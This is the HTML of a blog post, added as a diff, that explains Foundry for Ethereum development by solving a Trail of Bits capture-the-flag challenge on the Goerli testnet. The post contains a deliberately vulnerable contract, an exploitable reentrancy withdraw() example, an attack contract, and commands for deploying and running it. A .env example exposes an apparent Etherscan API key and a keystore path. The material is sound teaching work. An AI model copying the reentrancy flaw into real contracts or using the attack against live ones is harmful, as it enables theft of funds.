@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Foundry for Ethereum Contracts</title>
+  <meta name="description" content="Welcome to my blog!">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://axucar.ca/2022/09/09/foundryexplain/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Carlos" href="https://axucar.ca/feed.xml">
+
+  
+
+  
+  <meta property="og:title" content="Foundry for Ethereum Contracts">
+  <meta property="og:site_name" content="Carlos">
+  <meta property="og:url" content="https://axucar.ca/2022/09/09/foundryexplain/">
+  <meta property="og:description" content="Welcome to my blog!">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="jekyllrb">
+  <meta name="twitter:title" content="Foundry for Ethereum Contracts">
+  <meta name="twitter:description" content="Welcome to my blog!">
+  
+    <meta name="twitter:creator" content="jekyllrb">
+  
+  
+
+  <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Carlos</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/axucar">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Foundry for Ethereum Contracts</h1>
+    
+    <p class="post-meta"><time datetime="2022-09-09T00:00:00+00:00" itemprop="datePublished">Sep 9, 2022</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <ul id="markdown-toc">
+  <li><a href="#foundry" id="markdown-toc-foundry">Foundry</a></li>
+  <li><a href="#challenge-contract" id="markdown-toc-challenge-contract">Challenge contract</a></li>
+  <li><a href="#test-locally-using-foundry" id="markdown-toc-test-locally-using-foundry">Test locally using Foundry</a></li>
+  <li><a href="#deploy-to-goerli-testnet" id="markdown-toc-deploy-to-goerli-testnet">Deploy to Goerli testnet</a>    <ul>
+      <li><a href="#create-keystore-account-in-geth" id="markdown-toc-create-keystore-account-in-geth">Create keystore account in Geth</a></li>
+    </ul>
+  </li>
+  <li><a href="#using-cast-to-read--interact--sign" id="markdown-toc-using-cast-to-read--interact--sign">Using Cast to Read + Interact + Sign</a></li>
+</ul>
+
+<p>Below are my notes on how <a href="https://book.getfoundry.sh/">Foundry</a> deploys and interacts with Ethereum contracts, illustrated by solving a simple Solidity challenge.
+(add summary of everything below SQPT style).</p>
+
+<h2 id="foundry">Foundry</h2>
+
+<p>Foundry is an Ethereum smart contract development toolkit like Hardhat, but instead of writing scripts and tests to interact with the blockchain in Javascript, they can be done in Solidity or just command-line. Foundry is made up of 3 CLI tools: forge, cast, and anvil.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">forge</code> is used to compile, test, and deploy contracts</li>
+  <li><code class="language-plaintext highlighter-rouge">cast</code> is used to perform RPC calls, ie. send txs to the network, read from and interact with contracts</li>
+  <li><code class="language-plaintext highlighter-rouge">anvil</code> is a local testnet Ethereum node like Hardhat node.</li>
+  <li>To start a new project: <code class="language-plaintext highlighter-rouge">forge init</code>
+    <ul>
+      <li>creates new project <code class="language-plaintext highlighter-rouge">src,script,test,lib</code></li>
+    </ul>
+  </li>
+  <li>To set up VS code with solidity support
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">code</code> will spin up VS code.</li>
+      <li><code class="language-plaintext highlighter-rouge">Ctrl + Shift + P</code> gives Command Palette</li>
+      <li>Search for <code class="language-plaintext highlighter-rouge">Extensions: install Extensions</code></li>
+      <li>Install <code class="language-plaintext highlighter-rouge">solidity</code> by Juan Blanco extensions VS code</li>
+      <li>Run command <code class="language-plaintext highlighter-rouge">Preferences: Open Settings (UI)</code>
+        <ul>
+          <li>set <code class="language-plaintext highlighter-rouge">solidity.packageDefaultDependenciesContractsDirectory</code> as <code class="language-plaintext highlighter-rouge">src</code> (where <code class="language-plaintext highlighter-rouge">contracts</code> folder would refer to in Hardhat)</li>
+          <li>set <code class="language-plaintext highlighter-rouge">solidity.packageDefaultDependenciesDirectory</code> as <code class="language-plaintext highlighter-rouge">lib</code> (aka <code class="language-plaintext highlighter-rouge">node_modules</code> in Hardhat)</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="challenge-contract">Challenge contract</h2>
+
+<p>The below contract is a straight-forward “capture-the-flat” challenge from Trail of Bits. The original deployment can be found <a href="https://goerli.etherscan.io/address/0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E#code">here</a>.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="c1">// The goal of this challenge is to be able to sign offchain a message
+// with an address stored in winners.
+</span><span class="k">contract</span> <span class="n">Challenge</span><span class="p">{</span>
+    
+    <span class="kt">address</span><span class="p">[]</span> <span class="k">public</span> <span class="n">winners</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">lock</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="n">exploit_me</span><span class="p">(</span><span class="kt">address</span> <span class="n">winner</span><span class="p">)</span> <span class="k">public</span><span class="p">{</span>
+        <span class="n">lock</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+        <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+
+        <span class="nb">require</span><span class="p">(</span><span class="n">lock</span><span class="p">);</span>
+        <span class="n">winners</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">winner</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">lock_me</span><span class="p">()</span> <span class="k">public</span><span class="p">{</span>
+        <span class="n">lock</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>If you know about re-entrancy attacks (e.g. the famous DAO attack in 2016 where 3.6 million ETH tokens where drained), the vulnerability with <code class="language-plaintext highlighter-rouge">msg.sender.call("")</code> will be the first thing to stand out. Often in a <code class="language-plaintext highlighter-rouge">withdraw()</code> function of a contract, funds are transferred to the requester via a low-level function <code class="language-plaintext highlighter-rouge">call</code> (see <a href="https://solidity-by-example.org/call/">details</a>).</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//exploitable withdraw function, via reentrancy
+</span><span class="k">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="k">public</span><span class="p">{</span>
+    <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,)</span><span class="o">=</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="n">bal</span><span class="p">}();</span>
+
+    <span class="c1">//never resets balances mapping
+</span>    <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span><span class="s">"failed"</span><span class="p">);</span> 
+    <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>However, sending ether to a contract via <code class="language-plaintext highlighter-rouge">call</code> triggers either a <code class="language-plaintext highlighter-rouge">receive()</code> or a <code class="language-plaintext highlighter-rouge">fallback()</code> function in the receiving contract <code class="language-plaintext highlighter-rouge">msg.sender</code>, as detailed in <a href="https://solidity-by-example.org/sending-ether/">here</a>. We could deploy a malicious contract with a <code class="language-plaintext highlighter-rouge">fallback()</code> function which simply calls <code class="language-plaintext highlighter-rouge">withdraw()</code> in the victim contract again, thus repeatedly re-entering the withdraw function until the victim contract is drained.</p>
+
+<p>Switching context back to the simple challenge, all we have to do is call <code class="language-plaintext highlighter-rouge">lock_me()</code> in an attacker contract’s fallback function.</p>
+
+<p><strong>Attack contract:</strong></p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">challengeInterface</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">winners</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>    
+    <span class="k">function</span> <span class="n">exploit_me</span><span class="p">(</span><span class="kt">address</span> <span class="n">winner</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+    <span class="k">function</span> <span class="n">lock_me</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">MyAttack</span><span class="p">{</span>    
+    <span class="c1">//trail of bits challenge addr
+</span>    <span class="kt">address</span> <span class="n">chAddress</span> <span class="o">=</span> <span class="mh">0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E</span><span class="p">;</span>
+    <span class="n">challengeInterface</span> <span class="k">public</span> <span class="n">challengeContract</span> <span class="o">=</span> <span class="n">challengeInterface</span><span class="p">(</span><span class="n">chAddress</span><span class="p">);</span>
+    <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
+        <span class="n">challengeContract</span><span class="p">.</span><span class="n">lock_me</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="n">challengeContract</span><span class="p">.</span><span class="n">exploit_me</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="test-locally-using-foundry">Test locally using Foundry</h2>
+
+<p>Tests in Foundry are written in Solidity. In command-line, <code class="language-plaintext highlighter-rouge">forge test</code> scans through the <code class="language-plaintext highlighter-rouge">test</code> folder and runs all methods with names starting with “test*”. For this exercise, we use Goerli testnet. For mainnnet, just omit the <code class="language-plaintext highlighter-rouge">--goerli</code> tag.</p>
+
+<ul>
+  <li>We need an RPC node, so ensure our Geth node is active and running:  <code class="language-plaintext highlighter-rouge">geth --goerli --http</code>
+    <ul>
+      <li>To check Geth’s syncing status: in another terminal instance, run <code class="language-plaintext highlighter-rouge">geth --goerli attach</code>, and once attached to the Javascript console, entering <code class="language-plaintext highlighter-rouge">eth.syncing</code> will return either <code class="language-plaintext highlighter-rouge">false</code> (good) or details about progress with current block vs. highest block</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Testing locally is crucial for debugging since we can print <code class="language-plaintext highlighter-rouge">console.log()</code> statements, whereas deploying on live testnets cannot (since computation is done remotely on network of machines across the world).</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">forge test -vvvv --rpc-url $ETH_RPC_URL</code></p>
+
+<ul>
+  <li>In my case, <code class="language-plaintext highlighter-rouge">$ETH_RPC_URL</code> was <code class="language-plaintext highlighter-rouge">'http://localhost:3333'</code>
+    <ul>
+      <li>I use <a href="http://axucar.ca/2022/08/03/running-geth-node/#ssh-tunneling-local-port-forwarding">SSH tunnelling</a> from a remote machine to my laptop so the <code class="language-plaintext highlighter-rouge">$ETH_RPC_URL</code> is <code class="language-plaintext highlighter-rouge">'http://localhost:3333'</code> instead of the usual <code class="language-plaintext highlighter-rouge">localhost:8545</code>, when node is running on local machine (local port of 3333 is chosen arbitrarily)
+        <ul>
+          <li>As reminder, SSH tunnelling is done through <code class="language-plaintext highlighter-rouge">ssh -L localhost:3333:localhost:8545 remote_machinename@remote_ip</code></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Appending <code class="language-plaintext highlighter-rouge">--rpc-url $ETH_RPC_URL</code> runs the tests on a forked environment at the highest synced block in the provided RPC node endpoint, simulating state changes as if contracts were deployed, without writing permanent changes to the blockchain
+    <ul>
+      <li>Optionally, <code class="language-plaintext highlighter-rouge">--fork-block-number &lt;block_num&gt;</code> can also be used to further specify a precise block height, where <code class="language-plaintext highlighter-rouge">block_num</code> is something like 7382818 for Goerli. This was useful for testing since the challenge contract was being modified by others (writing to the <code class="language-plaintext highlighter-rouge">winner</code> array), and I had hard-coded a length (31) for the array in the test script.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Below is my testing script.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// File under test/Contract.t.sol
+// SPDX-License-Identifier: UNLICENSED
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"forge-std/Test.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"src/Attack.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">ContractTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+    <span class="n">challengeInterface</span> <span class="n">challenge</span><span class="p">;</span>
+    <span class="n">MyAttack</span> <span class="n">myAttack</span><span class="p">;</span>
+    <span class="k">function</span> <span class="n">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="c1">//trail of bits challenge contract 
+</span>        <span class="n">challenge</span> <span class="o">=</span> <span class="n">challengeInterface</span><span class="p">(</span><span class="mh">0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E</span><span class="p">);</span>
+        <span class="n">myAttack</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyAttack</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">testExploit</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="mh">0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3</span><span class="p">;</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>   <span class="c1">//sets msg.sender for contract calls; e.g. as if player is calling the contracts   
+</span>                        
+        <span class="n">myAttack</span><span class="p">.</span><span class="n">attack</span><span class="p">();</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">winners</span><span class="p">(</span><span class="mi">31</span><span class="p">));</span> <span class="c1">//should show our player
+</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Printing <code class="language-plaintext highlighter-rouge">console.log(challenge.winners(31))</code> confirmed my <code class="language-plaintext highlighter-rouge">player</code> address had been added to the <code class="language-plaintext highlighter-rouge">winner</code> array. I know the index of the last element should be 31 by checking the value at the first storage slot of the challenge contract, since <code class="language-plaintext highlighter-rouge">winners</code> is the first declared variable of the challenge contract. For dynamic arrays, the storage slot corresponding to the variable stores the number of elements in the array (see <a href="https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays">storage layout docs</a>).</p>
+
+<p>To query the first storage slot of the challenge contract:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cast storage 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E 0 --block 7382818</code> , which returns <code class="language-plaintext highlighter-rouge">0x000000000000000000000000000000000000000000000000000000000000001f</code> = 31.</li>
+</ul>
+
+<h2 id="deploy-to-goerli-testnet">Deploy to Goerli testnet</h2>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">forge create src/Attack.sol:MyAttack --verify</code></p>
+
+<ul>
+  <li>Beforehand, define and source <code class="language-plaintext highlighter-rouge">.env</code> file with keystore path (for sender authentication, and Etherscan API for verifying contracts). See <a href="#create-keystore-account-in-geth">section below</a> on how to create keystores
+    <div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//source this .env file
+</span><span class="n">ETHERSCAN_API_KEY</span><span class="o">=</span><span class="n">ZSED47H9XHGGHAJT86FXPC1Y57YGRM1H3R</span>
+<span class="n">ETH_KEYSTORE</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">chihiro</span><span class="o">/</span><span class="p">.</span><span class="n">ethereum</span><span class="o">/</span><span class="n">goerli</span><span class="o">/</span><span class="n">keystore</span><span class="o">/</span><span class="n">UTC</span><span class="o">--</span><span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">07</span><span class="n">T23</span><span class="o">-</span><span class="mi">58</span><span class="o">-</span><span class="mf">04.686858789</span><span class="n">Z</span><span class="o">--</span><span class="mi">08e1</span><span class="n">eb1a25e7389488016a25cacb51d169cd27a3</span>
+<span class="n">ETH_RPC_URL</span><span class="o">=</span><span class="s">'http://localhost:3333'</span> <span class="c1">//running Goerli node
+</span></code></pre></div>    </div>
+  </li>
+  <li>Appending <code class="language-plaintext highlighter-rouge">—verify</code> flag adds Etherscan contract verifcation. Thus, anyone can read the contract source code on Etherscan, which has been verified to compile to the bytecode (ie. low level machine language executed by the EVM, which uniquely defines the logic for how contract behaves).</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">solc = '0.8.10'</code> in <code class="language-plaintext highlighter-rouge">foundry.toml</code> to match the Solidity version used by my contracts.</li>
+</ul>
+
+<p>Deployed the <a href="https://goerli.etherscan.io/address/0x6d4b8b1025f758f41F440b511A10d9faa4B50384#code">Attack contract</a> with verified code at <code class="language-plaintext highlighter-rouge">0x6d4b8b1025f758f41F440b511A10d9faa4B503841</code>.</p>
+
+<h3 id="create-keystore-account-in-geth">Create keystore account in Geth</h3>
+<p>A keystore can be understood as a private key encrypted by a password. To write anything on-chain, we need a keystore (or a raw private key).</p>
+<ul>
+  <li>In the machine running the Geth node, create an account via <code class="language-plaintext highlighter-rouge">geth --goerli account new</code>
+    <ul>
+      <li>generates keystores at <code class="language-plaintext highlighter-rouge">/home/chihiro/.ethereum/goerli/keystore</code></li>
+      <li>REMEMBER THE PASSWORD! We are prompted for it any time we use the keystore</li>
+      <li>note down the address. For example, <code class="language-plaintext highlighter-rouge">0x08e1eb1a25e7389488016a25cacb51d169cd27a3</code> is mine</li>
+      <li>To confirm its creation, attach to the Geth Javascript console: <code class="language-plaintext highlighter-rouge">geth --goerli attach</code> : now we should see the newly created account when calling <code class="language-plaintext highlighter-rouge">eth.accounts</code></li>
+      <li>Keystore is generated in <code class="language-plaintext highlighter-rouge">/home/chihiro/.ethereum/goerli/keystore</code></li>
+    </ul>
+  </li>
+  <li>Next, request some Goerli ETH from Alchemy faucet, or Paradigm’s faucet</li>
+  <li>As an alternative to using your own Geth node and corresponding keystore, you can instead specify an <code class="language-plaintext highlighter-rouge">ETH_RPC_URL</code> from a node provider like Alchemy and provide explicit private keys
+    <ul>
+      <li>If you choose to specify explicit private keys, it requires adding <code class="language-plaintext highlighter-rouge">--private-key $PRIVATE_KEY</code> to Foundry commands that write to the blockchain, e.g. <code class="language-plaintext highlighter-rouge">forge create</code>, <code class="language-plaintext highlighter-rouge">cast send</code>, etc.</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//source this .env file
+</span><span class="n">ETHERSCAN_API_KEY</span><span class="o">=&lt;</span><span class="n">YOUR_API_KEY</span><span class="o">&gt;</span>
+<span class="n">ETH_RPC_URL</span><span class="o">=</span><span class="s">'https://eth-goerli.g.alchemy.com/v2/&lt;API_KEY&gt;'</span>
+<span class="n">PRIVATE_KEY</span><span class="o">=&lt;</span><span class="mi">64</span><span class="o">-</span><span class="n">HEX</span><span class="o">-</span><span class="n">CHAR</span><span class="o">-</span><span class="n">PRIVKEY</span><span class="o">&gt;</span>
+<span class="n">ETH_FROM</span><span class="o">=&lt;</span><span class="mi">40</span><span class="o">-</span><span class="n">HEX</span><span class="o">-</span><span class="n">CHAR</span><span class="o">-</span><span class="n">ADDRESS</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="using-cast-to-read--interact--sign">Using Cast to Read + Interact + Sign</h2>
+
+<p>Cast has a variety of use-cases.</p>
+
+<ul>
+  <li><strong>Write</strong>: publish tx: <code class="language-plaintext highlighter-rouge">cast send &lt;contract_addr&gt; "fn()"</code><br />
+For example, to finish our attack above, we call <code class="language-plaintext highlighter-rouge">attack()</code> on the deployed attack contract. <br />
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast send &lt;attack_addr&gt; "attack()" --gas-limit 120000</code></li>
+      <li>Ran out of gas at first, needed to add gas-limit. Possible that <code class="language-plaintext highlighter-rouge">cast estimate &lt;attack_addr&gt; "attack()"</code> is off sometimes (which it runs implicitly).</li>
+    </ul>
+  </li>
+  <li><strong>Read</strong>: read on-chain data (no gas required, and no private key needed) <code class="language-plaintext highlighter-rouge">cast call &lt;contract addr&gt; “fn(input_type)(output_type)”</code><br />
+To confirm we completed the challenge, we verify that <code class="language-plaintext highlighter-rouge">0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3</code> is on the <code class="language-plaintext highlighter-rouge">winners</code> array written permanently on the blockchain. <br />
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast call 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E "winners(uint256)(address)" 24</code></li>
+    </ul>
+  </li>
+  <li><strong>Sign:</strong> we can also sign messages off-chain. For instance, below I prove that I (Carlos) am the owner of the address inside the <code class="language-plaintext highlighter-rouge">winner</code> array.</li>
+</ul>
+
+<p>For any judge to verify the validity of a signature (e.g. via Etherscan Verified Signatures <a href="https://etherscan.io/verifiedSignatures#">https://etherscan.io/verifiedSignatures#</a>): we require 3 pieces of data.</p>
+
+<ol>
+  <li>Signer Address (ie. address in <code class="language-plaintext highlighter-rouge">winner</code> array): <code class="language-plaintext highlighter-rouge">0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3</code></li>
+  <li>Message: “My name is Carlos Xu, and I completed the challenge at 0xd101a9081dc733f1e2cd51454cbed7e3e2c8644dde049ea22d49bc036af3988d”</li>
+  <li>Signature: <code class="language-plaintext highlighter-rouge">0x85c606541bddf728111f93ba5e70310133fe5b06d5f51882508dcdaaf0cb969c083f0864e8c9f8ff6d1cdc48892bc8fc39f60cb41512145630d1a97d12db79c31c</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast wallet sign &lt;message&gt;</code> returns the signature</li>
+      <li>Only someone with access to keystore of the signer address could have produced this signature corresponding to the message. However, anyone can verify this signature to be valid.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>If anyone else (with a different private key and hence signer address) tries to generate a signature on the same message string, the signature will be entirely different. 
+Thus, the above suffices to prove that the owner of the private key for <code class="language-plaintext highlighter-rouge">0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3</code> wrote the above message claiming to be Carlos.</p>
+
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy;  - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://axucar.ca/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
